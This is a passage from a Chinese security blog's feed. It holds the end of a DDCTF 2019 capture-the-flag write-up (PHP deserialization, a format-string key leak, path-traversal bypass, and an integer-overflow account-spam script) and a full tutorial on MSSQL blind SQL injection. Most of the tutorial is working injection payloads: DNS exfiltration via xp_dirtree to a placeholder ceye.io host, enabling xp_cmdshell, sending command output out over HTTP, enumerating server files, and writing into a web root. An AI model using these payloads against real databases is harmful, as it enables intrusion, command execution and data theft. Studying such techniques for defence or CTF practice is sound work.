class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $session = unserialize($session);</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</div><div class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</div><div class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</div><div class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">                $data = sprintf($data,$v);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</div><div class="line">        $sessionid = <span class="string">''</span>;</div><div class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</div><div class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $userdata = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</div><div class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</div><div class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</div><div class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</div><div class="line">        );</div><div class="line"></div><div class="line">        $cookiedata = serialize($userdata);</div><div class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</div><div class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</div><div class="line">        setcookie(</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</div><div class="line">            $cookiedata,</div><div class="line">            $expire,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</div><div class="line">            );</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">$ddctf = <span class="keyword">new</span> Session();</div><div class="line">$ddctf-&gt;index();</div></pre></td></tr></table></figure><p><strong>通过对代码代码审计可以看到在$session = unserialize($session)这里存在一个反序列化漏洞，这个点应该是个突破点，可以通过传入反序列化字符串触发Application对象当中的_destructs方法，_destructs当中存在任意文件读取，通过任意文件读取就可以读取到flag，另外代码里面限制了$path值为18个字符，结合代码的注释可以大概猜到flag文件为<code>../config/flag.txt</code>。</strong></p><p><strong>但是想要触发反序列化漏洞，首先需要获取到<code>../config/key.txt</code>文件当中的key，否则cookie是不能随意修改的，因为这里存在认证，获取key的方法如下</strong></p><p><strong>第一步，请求Session.php，<code>session_create</code>函数会设置cookie,这里先获取到cookie</strong><br><img src="http://pic.c1imber.top/blog/20190418/aHiYJXKwQHTd.png" alt="mark"></p><p><strong>第二步：将获取到的cookie添加到请求里面，绕过”the cookie data not match”</strong><br><img src="http://pic.c1imber.top/blog/20190418/vtlx25O4WU4w.png" alt="mark"></p><p><strong>接下来在传入post参数nickname的代码处，有一个foreach循环，这里会将key输出，代码如下：</strong><br><img src="http://pic.c1imber.top/blog/20190418/l3Jbk2CXxyoS.png" alt="mark"></p><p><strong>第一次循环，将Welcome my friend %s当中的%s替换为了<code>$_POST[&#39;nickname&#39;]</code>,此时$data变为了Welcome my friend <code>$_POST[&#39;nickname&#39;]</code>,第二次循环，要将key写入$data的时候，%s已经没有了，所以这里只输出了传入的nickname而不是key</strong><br><img src="http://pic.c1imber.top/blog/20190418/NmO1mi9EAbv5.png" alt="mark"><br><strong>那么要想输出key，可以将nickname设置为%s，这样第一次循环后$data变为了Welcome my friend %s，第二次循环后%s就可以被替换为key输出了</strong><br><img src="http://pic.c1imber.top/blog/20190418/y1MpCfVvI1f5.png" alt="mark"><br><strong>获取到key值：<code>EzblrbNSO</code>,得到key后,$cookiedata的值就可以随便构造了，这里构造序列化字符串进行任意文件读取，生成的exp代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> Application();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="keyword">echo</span> md5(<span class="string">'EzblrbNSO:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>因为 <code>$path=str_replace(&#39;../&#39;,&#39;&#39;,$path);$path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);</code>会删除<code>../</code>，所以这里需要使用双写<code>..././</code>绕过,之后得到:</strong></p><p><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}5a014dbe49334e6dbb7326046950bee2</code><br><strong>将生成的exp进行传入cookie当中的ddctf_id请求即可，注意这里需要将<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}</code>部分进行url编码，这样做是为了防止一些特殊字符的影响，然后就可以获取到flag了</strong><br><img src="http://pic.c1imber.top/blog/20190418/vPMp7lTuQoPn.png" alt="mark"></p><p><strong>flag:<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></strong></p><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p><code>http://117.51.148.166/upload.php</code></p><p><strong>题目提供了用户名和密码：</strong></p><pre><code>user：dd@ctfpass：DD@ctf#000</code></pre><p><strong>通过提供用户名密码登陆后看到是一个上传页面</strong><br><img src="http://pic.c1imber.top/blog/20190418/6Pb8mqQLuHSf.png" alt="mark"><br><strong>经过尝试发现这里对图片的16进制头做了检查，另一方面也会对上传的图片进行二次渲染，上传的图片格式都会变成jpg图片格式的</strong></p><p><strong>这里要求上传的图片里必须要phpinfo()这个字符串才能输出flag，但是由于二次渲染会的原因，图片当中插入的代码会被删除，这里需要突破二次渲染，类似于upload-labs的第16关，相关文章如下：</strong></p><p><code>https://xz.aliyun.com/t/2657</code></p><p><strong>这里可以使用文章当中提到的国外大神写的脚本实现对jpg二次渲染的突破</strong></p><p><code>https://github.com/BlackFan/jpg_payload</code><br><strong>最终通过脚本生成的图片成功得到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/QNoDrGXml9h4.png" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20190418/pj6zqJaN3Jd7.png" alt="mark"></p><p>flag:<code>DDCTF{B3s7_7ry_php1nf0_85127c366b3a9fad}</code></p><h3 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h3><p><code>http://117.51.147.155:5050/index.html#/login</code></p><p><strong>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</strong></p><p><strong>注册账户登陆，发现自己只有100余额，但是购买门票需要2000余额</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/BU1uMNLvLkUQ.png" alt="mark"></p><p><strong>于是想到了之前护网杯买大辣条的一道题，这里应该存在整型溢出，经过测试发现这里存在uint32位的整型溢出.在立即购买下订单的时候修改金额为2^32+1，也就是4294967297</strong><br><img src="http://pic.c1imber.top/blog/20190418/ADFyVBLmpLiI.png" alt="mark"></p><p><strong>接下来在支付的时候可以产生溢出，通过1余额购买到门票</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/aDyWIhrtAFI0.png" alt="mark"><br><img src="http://pic.c1imber.top/blog/20190418/km8bh2cjwLJP.png" alt="mark"><br><strong>买到票后可以获得礼包，礼包当中包括了id和ticket，游戏规则大概是这样：每个账号在买完票后都会生成自己的id和ticket，如果想要消灭对方，需要知道对方的id和ticket才可以。</strong></p><p><strong>但是这一点注册账号是没有任何限制的，所以这里可以通过注册大量的账号，通过溢出购买门票获得id和ticket，之后使用其中一个账号消灭其它的账号即可，整个过程可以通过脚本实现，几个操作的接口如下：</strong></p><p><strong>注册接口</strong><br><code>http://117.51.147.155:5050/ctf/api/register?name=xxx&amp;password=xxx</code></p><p><strong>登陆接口</strong><br><code>http://117.51.147.155:5050/ctf/api/login?name=xxx&amp;password=xxx</code></p><p><strong>请求支付/下订单接口,下完订单会返回对应的bill_id</strong><br><code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297</code></p><p><strong>支付接口：通过溢出实现门票购买,购买成功后会返回对于的id和ticket</strong><br><code>http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=</code></p><p><strong>移除对手接口</strong><br><code>http://117.51.147.155:5050/ctf/api/remove_robot?id=xxx&amp;ticket=xxx</code></p><p><strong>最终编写出脚本如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line">username=[]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        url=<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=mk%s&amp;password=12345678"</span>%(i)</div><div class="line">        r=requests.get(url).json()</div><div class="line">        <span class="keyword">print</span> r</div><div class="line">        <span class="keyword">if</span> len(username)==<span class="number">400</span>:</div><div class="line">            <span class="keyword">print</span> username</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> r[<span class="string">'code'</span>]==<span class="number">200</span>:</div><div class="line">            username.append(<span class="string">"mk%s"</span>%(i))</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">register()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> username:</div><div class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=12345678"</span>%(i)</div><div class="line">    <span class="comment">#print url</span></div><div class="line">    r=requests.session()</div><div class="line">    r.get(url)</div><div class="line">    payurl=<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297"</span></div><div class="line">    data=r.get(payurl).json()</div><div class="line">    bill_id=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</div><div class="line">    pay=<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</div><div class="line">    data=r.get(pay).json()</div><div class="line">    yourid=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>]</div><div class="line">    ticket=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</div><div class="line">    r.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=st4rk&amp;password=12345678"</span>)</div><div class="line">    delurl=<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(yourid,ticket)</div><div class="line">    <span class="keyword">print</span> r.get(delurl).json()</div></pre></td></tr></table></figure><p><strong>接下来就可以执行脚本获取flag，需要注意的一点就是这里不是每个账号都可以消灭成功的，而且越往后，消灭的概率就会越低，写这道题的时候自己大概注册了快10000个账号才吃到鸡==</strong></p><p><strong>最终获取到flag:</strong><br><img src="http://pic.c1imber.top/blog/20190418/Bof7wUbqtsYX.png" alt="mark"></p><p><strong>flag:<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-write-up&quot;&gt;&lt;a href=&quot;#DDCTF2019-write-up&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019 write up&quot;&gt;&lt;/a&gt;DDCTF2019 write up&lt;/h1&gt;&lt;p&gt;&lt;stron
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</title>
    <link href="https://c1aysec.github.io/2019/03/17/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8dnslog%E5%8A%A0%E5%BF%AB%E7%9B%B2%E6%B3%A8%E9%80%9F%E5%BA%A6(MSSQL%E7%AF%87)/"/>
    <id>https://c1aysec.github.io/2019/03/17/渗透技巧-使用dnslog加快盲注速度(MSSQL篇)/</id>
    <published>2019-03-17T13:36:43.000Z</published>
    <updated>2020-03-31T04:41:25.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度-MSSQL篇"><a href="#渗透技巧-使用dnslog加快盲注速度-MSSQL篇" class="headerlink" title="渗透技巧-使用dnslog加快盲注速度(MSSQL篇)"></a>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</h1><p><strong>关于dnslog盲注，之前写过的两篇文章：</strong></p><p><strong>渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</strong></p><p><strong>记一次dnslog接收异常分析</strong></p><p><strong>这一次详细的总结一下dnslog在mssql盲注当中的使用</strong></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><pre><code>1.服务器操作系统为windows2.mssql数据库支持master..xp_dirtree存储过程3.mssql注入点支持执行多语句4.mssql相对与mysql的优势在于可以执行系统命令，前提是需要支持master..xp_cmdshell存储过程。</code></pre><p><strong>可以看到，相比于mysql数据库，mssql的利用方法相对来说更多一些，下面介绍两种外带数据查询的方法</strong></p><h3 id="DNS外带查询"><a href="#DNS外带查询" class="headerlink" title="DNS外带查询"></a>DNS外带查询</h3><p><strong>注入点如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191108/0MNqLkFU7N2k.png?imageslim" alt="mark"></p><p><strong>注入类型为布尔盲注或者时间盲注，传参本来为get，但是长度有限制，改为post传参即可以突破限制，可以看到有10s的延时</strong></p><p><strong>尝试使用dnslog获取当前用户：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2buser%2b&apos;.xxx.ceye.io/abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>注意这里由于POST DATA参数解析的问题，+会被当成空格，所以需要进行url编码，将+变为%2b</strong></p><p><strong>简单说一下这条sql语句的意思，首先将user的执行结果拼接进unc路径，接着通过xp_dirtree存储过程向unc路径发起请求，产生dns查询，在dnslog平台留下记录，可以看到dnslog接收到的user为dbo</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/yTHkeMQajXPz.png?imageslim" alt="mark"></p><p><strong>查看@@version数据库版本，由于长度超过了128个字符，需要分几次截取</strong></p><p><strong>首先确定长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(@@version) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>因为len的结果为数字型，mssql并不存在类型转换的特性，所以数字不能与字符串直接拼接，这里需要通过cast转化为字符型，可以看到接收到长度为189字节</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/zBqBnylhQOg4.png?imageslim" alt="mark"></p><p><strong>由于unc长度有限制，直接获取的话内容会被截断，所以要分两次截取：</strong></p><p><strong>第一次 1-95</strong></p><p><strong>第二次 95-189</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,1,95))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--  declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,96,94))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>通过两次的截取成功获取到了完整的数据库版本信息</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/GKQOgwoG6SQk.png?imageslim" alt="mark"></p><pre><code>microsoft sql server 2000 - 8.00.2039 (intel x86) may 3 2005 23:18:38 copyright (c) 1988-2003 microsoft corporation enterprise edition on windows nt 5.2 (build 3790: service pack 2)</code></pre><p><strong>当然还需要考虑一种特殊情况，假设说查询结果当中出现了一些unc路径不允许的特殊字符，那么在截取之前还需要进行一次16进制编写码</strong></p><p><strong>mssql当中字符串转16进制函数：</strong></p><pre><code>master.dbo.fn_varbintohexstr(xxx as VARBINARY(num))</code></pre><p><strong>首先查看版本信息16进制编码结果的长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000)))) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/9xUX1j8mJVnx.png?imageslim" alt="mark"></p><p><strong>长度为758，分几次截取就可以得到完整的结果</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),61,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),121,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),181,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),241,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- .........declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),661,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),721,37))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/MnCF17wsmOEk.png?imageslim" alt="mark"></p><p><strong>可以看到dnslog接收到了每一次的结果，将结果拼接后得到：</strong></p><pre><code>4d006900630072006f0073006f00660074002000530051004c00200053006500720076006500720020002000320030003000300020002d00200038002e00300030002e0032003000330039002000280049006e00740065006c002000580038003600290020000a0009004d0061007900200020003300200032003000300035002000320033003a00310038003a003300380020000a00090043006f0070007900720069006700680074002000280063002900200031003900380038002d00320030003000330020004d006900630072006f006e000a00090045006e00740065007200700072006900730065002000450064006900740069006f006e0020006f006e002000570069006e0064006f007700730020004e005400200035002e003200200028004200750069006c006400200033003700390030003a002000530065007200760069006300650020005000610063006b002000320029000a0</code></pre><p><strong>再进行16进制解码</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/k5McwtBhcWju.png?imageslim" alt="mark"></p><p><strong>通过上面的思路，我们就可以获取任何数据了,同样也可以执行命令，首先看一下数据库是否支持master..xp_cmdshell这个存储过程，如果没有需要开启</strong></p><pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;-- </code></pre><p><strong>测试注入点是否可以执行命令，最简单的办法就是ping一下ceye.io的二级域名，如果有dns记录，那就是支持了</strong></p><pre><code>exec master..xp_cmdshell &quot;ping aaa.xxx.ceye.io&quot;;-- </code></pre><p><strong>通过以下几个步骤可以将执行命令的结果回显至dnslog</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><pre><code>CREATE TABLE tt_tmp (id INT PRIMARY KEY IDENTITY,tmp1 nvarchar(4000));-- </code></pre><p><strong>第二步：将命令执行结果插入临时表：</strong></p><pre><code>DECLARE @code varchar(4000);SET @code=0x77686f616d69;insert into tt_tmp(tmp1) exec master..xp_cmdshell @code;-- </code></pre><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select rtrim(cast(COUNT(*) as char(32))) from tt_tmp)%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(cast((select tmp1 from tt_tmp where id=1) as char(255)) as VARBINARY(4000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- 1-6061-120121-180181-240241-300301-360361-420421-480481-512</code></pre><p><strong>成功后记得删除临时表</strong></p><pre><code>drop table tt_tmp;-- </code></pre><p><strong>主要过程就是创建一个临时表，然后读取临时表，将读取的结果发送至dnslog，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/gdOYM8Vnn0yl.png?imageslim" alt="mark"></p><h3 id="HTTP外带查询"><a href="#HTTP外带查询" class="headerlink" title="HTTP外带查询"></a>HTTP外带查询</h3><p><strong>通过第一种方法，可以看到dns外带查询对长度以及一些特殊字符都有着严格的限制，比较麻烦，为了解决这个问题，可以通过HTTP外带查询的方式去代替</strong></p><p><strong>可以通过cmd命令，将执行命令的结果拼接进url，启动浏览器进程去发起http请求</strong></p><p><strong>执行whoami</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;whoami&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Qd6243BxirrD.png?imageslim" alt="mark"></p><p><strong>执行dir</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;dir&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Nv2m454pz5MX.png?imageslim" alt="mark"></p><p><strong>但是通过这种方法获取到的结果，会被空格截断，可以看到上面接收的结果都是不完整的，遇到空格就会被截断，不显示后面的内容</strong></p><p><strong>另外这种方法还有一些缺点，就是会在服务器启动大量的浏览器进程，有可能会导致服务器卡死或者被防火墙拦截，需要时不时的关闭浏览器进程</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- </code></pre><p><strong>其它思路</strong></p><p><strong>可以通过此方法获取网站的根目录，之后将命令的执行结果写入到根目录的一个文件中</strong></p><p><strong>遍历C盘下的aspx后缀文件</strong></p><pre><code>exec master..xp_cmdshell &quot;for /r C:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/LF9YA9cPAbmS.png?imageslim" alt="mark"></p><p><strong>遍历D盘下的aspx文件</strong></p><pre><code>exec master..xp_cmdshell &quot;taskkill /f /im iexplore.exe&quot;-- exec master..xp_cmdshell &quot;for /r D:\ %i in (*.aspx) do start http://xxx.ceye.io/%i&quot;-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/n67mO6S9UwDH.png?imageslim" alt="mark"></p><p><strong>最终确定了D:/zhenghedabu/这个路径就是网站的物理路径了。</strong></p><p><strong>获取到网站的物理路径后，会有更多的利用手法</strong></p><p><strong>比如可以将命令的执行结果输出到网站目录下的一个txt文本文件当中当中</strong></p><pre><code>exec master..xp_cmdshell &quot;ipconfig &gt; D:\zhenghedabu\tmp2019.txt&quot;-- </code></pre><p><strong>之后可以看到命令执行的结果</strong><br><img src="http://pic.c1imber.top/blog/20191109/jg9FftdPdj94.png?imageslim" alt="mark"></p><p><strong>同样的，知道了网站物理路径，也可以直接写入webshell</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>使用dnslog可以有效的增加渗透的效率，避免了在盲注上花费过多的时间，但是思路也不能单单禁锢于这一种方式，比如mssql的注入点，可以执行命令，那么也可以直接通过反弹shell到公网的服务器上的。所以方法思路还是很多的，要合理使用才能事半功倍。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度-MSSQL篇&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧-使用dnslog加快盲注速度(MSSQL篇)&quot;&gt;&lt;/a&gt;渗透技巧-使用
      
    
    </summary>
    
      <category term="web安全" scheme="https://c1aysec.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://c1aysec.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
